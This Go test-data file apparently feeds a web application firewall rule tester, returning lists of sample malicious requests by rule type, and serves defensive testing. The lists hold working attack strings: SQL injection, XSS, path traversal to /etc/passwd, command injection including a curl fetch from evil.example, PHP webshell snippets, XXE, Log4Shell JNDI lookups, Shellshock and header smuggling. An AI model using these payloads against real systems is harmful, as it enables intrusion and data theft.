package ruletest

// 本文件存放各类型规则的**样例载荷**。
//
// 编写原则：
//   - 样例要贴近真实攻击流量（不是教科书里的最简形式），这样规则能命中说明线上大概率也拦得住；
//   - 每类给足样本量（同一攻击的多种写法），避免「只对一个特例有效」的规则被误判为正常；
//   - IP 名单、URL 白名单这类规则无法用固定样例判断，返回空集 → 状态记 skipped。

// samplesFor 返回某类型规则的样例载荷。
func samplesFor(ruleType string) []string {
	switch ruleType {
	case "args":
		return argSamples
	case "post":
		return postSamples
	case "url":
		return urlSamples
	case "cookie":
		return cookieSamples
	case "useragent", "user-agent":
		return userAgentSamples
	case "header":
		return headerSamples
	default:
		// blackip / whiteip / whiteUrl 等：需要真实请求上下文，无法用样例判断
		return nil
	}
}

// argSamples 为 URL / GET 参数类规则的样例（含未编码与已编码两种写法）。
var argSamples = []string{
	"id=1 union select 1,2,3 from users",
	"id=1%20union%20select%201,2,3",
	"id=1 and 1=1",
	"id=1' or '1'='1",
	"id=1;drop table users--",
	"name=<script>alert(1)</script>",
	"name=%3Cscript%3Ealert(1)%3C/script%3E",
	"q=<img src=x onerror=alert(1)>",
	"q=javascript:alert(document.cookie)",
	"file=../../../../etc/passwd",
	"file=..%2f..%2fetc%2fpasswd",
	"path=/etc/shadow",
	"cmd=;cat /etc/passwd",
	"cmd=|whoami",
	"cmd=`id`",
	"cmd=$(curl http://evil.example/x.sh)",
	"exec=phpinfo()",
	"code=<?php system($_GET['c']); ?>",
	"url=http://127.0.0.1:6379/",
	"url=file:///etc/passwd",
	"host=127.0.0.1:3306",
	"select=select * from information_schema.tables",
	"payload=benchmark(10000000,md5(1))",
	"payload=sleep(5)",
	"payload=extractvalue(1,concat(0x7e,version()))",
	"ldap=*)(uid=*))(|(uid=*",
	"xpath='/or '1'='1",
	"ssti={{7*7}}",
	"ssti=${jndi:ldap://evil.example/a}",
	"log4j=${${lower:j}ndi:ldap://evil/a}",
	"traversal=....//....//etc/passwd",
	"upload=svn://evil",
	"scan=nmap",
}

// postSamples 为 POST 体类规则的样例（表单与 JSON 两种形态）。
var postSamples = []string{
	"username=admin&password=1' or '1'='1",
	"username=admin'--&password=x",
	"content=1 union select user(),password from mysql.user",
	"content=1%20union%20select%201",
	"comment=<script>alert(document.domain)</script>",
	"comment=<svg/onload=alert(1)>",
	"comment=<iframe src=javascript:alert(1)>",
	"filename=../../../../var/www/html/shell.php",
	"filename=shell.php%00.jpg",
	"cmd=;id;",
	"cmd=`uname -a`",
	"cmd=$(cat /etc/passwd)",
	"data=<?php eval($_POST[1]); ?>",
	"data=<%@ page import=\"java.util.*\" %>",
	"{\"id\":\"1 union select 1,2\"}",
	"{\"name\":\"<script>alert(1)</script>\"}",
	"{\"@type\":\"java.lang.AutoCloseable\"}",
	"{\"$where\":\"1==1\"}",
	"phone=1' and (select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -",
	"xml=<!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]>",
	"filter=convert(int,(select @@version))",
	"search=1;waitfor delay '0:0:5'--",
	"login=true and 1=1",
	"op=upload&ext=.jsp",
	"payload={{config.items()}}",
}

// urlSamples 为路径类规则的样例（敏感文件、后台路径、扫描器指纹等）。
var urlSamples = []string{
	"/.git/config",
	"/.svn/entries",
	"/.env",
	"/.aws/credentials",
	"/config.php.bak",
	"/index.php.swp",
	"/backup.sql",
	"/db.sql.gz",
	"/etc/passwd",
	"/../../../../etc/passwd",
	"/%2e%2e%2f%2e%2e%2fetc/passwd",
	"/wp-admin/",
	"/wp-login.php",
	"/phpmyadmin/index.php",
	"/pma/index.php",
	"/administrator/index.php",
	"/actuator/env",
	"/actuator/health",
	"/console/",
	"/druid/index.html",
	"/solr/admin/",
	"/jenkins/script",
	"/manager/html",
	"/phpinfo.php",
	"/test.php?id=1 union select 1",
	"/index.php?page=../../etc/passwd",
	"/shell.jsp",
	"/cmd.exe",
	"/cgi-bin/luci",
	"/owa/auth/logon.aspx",
	"/api/v1/order?id=1 union select 1",
	"/%c0%ae%c0%ae/etc/passwd",
}

// cookieSamples 为 Cookie 类规则的样例。
var cookieSamples = []string{
	"PHPSESSID=../../../../etc/passwd",
	"session=<script>alert(1)</script>",
	"token=1' or '1'='1",
	"lang=zh-CN; path=/; id=1 union select 1",
	"__test=<img src=x onerror=alert(1)>",
	"uid=${jndi:ldap://evil/a}",
	"cart=|whoami",
	"theme=../../boot.ini",
	"JSESSIONID=$(cat /etc/passwd)",
}

// userAgentSamples 为 User-Agent 类规则的样例（扫描器/Bot 指纹）。
var userAgentSamples = []string{
	"sqlmap/1.7.2#stable (https://sqlmap.org)",
	"Mozilla/5.0 (compatible; Nmap Scripting Engine)",
	"masscan/1.3",
	"zgrab/0.x",
	"Nuclei - Open-source project",
	"WPScan v3.8.22",
	"Nikto/2.1.6",
	"DirBuster-1.0-RC1",
	"curl/8.4.0",
	"python-requests/2.31.0",
	"Go-http-client/1.1",
	"Java/1.8.0_181",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
}

// headerSamples 为请求头类规则的样例（Host/Referer/XFF/Content-Length 等）。
var headerSamples = []string{
	"Host: evil.example.com",
	"Host: 127.0.0.1",
	"Host: localhost:8080",
	"Host: 192.168.1.1",
	"Referer: <script>alert(1)</script>",
	"Referer: http://evil.example/",
	"X-Forwarded-For: 127.0.0.1",
	"X-Real-IP: 10.0.0.1",
	"X-Original-URL: /admin",
	"X-Rewrite-URL: /admin",
	"Content-Length: 999999999",
	"Content-Type: application/x-www-form-urlencoded\r\n\r\nGET /admin",
	"User-Agent: () { :; }; /bin/bash -c 'id'",
	"Accept: ../../etc/passwd",
	"Cookie: PHPSESSID=../../etc/passwd",
	"X-Forwarded-Host: evil.example.com",
	"X-Forwarded-Host: a.example\r\nX-Forwarded-Host: b.example",
	"Host: a.example%0d%0aHost: b.example",
	"X-Forwarded-For: 127.0.0.1\nX-Forwarded-For: 10.0.0.1",
	"Proxy: http://evil.example",
	"Via: 1.1 evil.example",
}
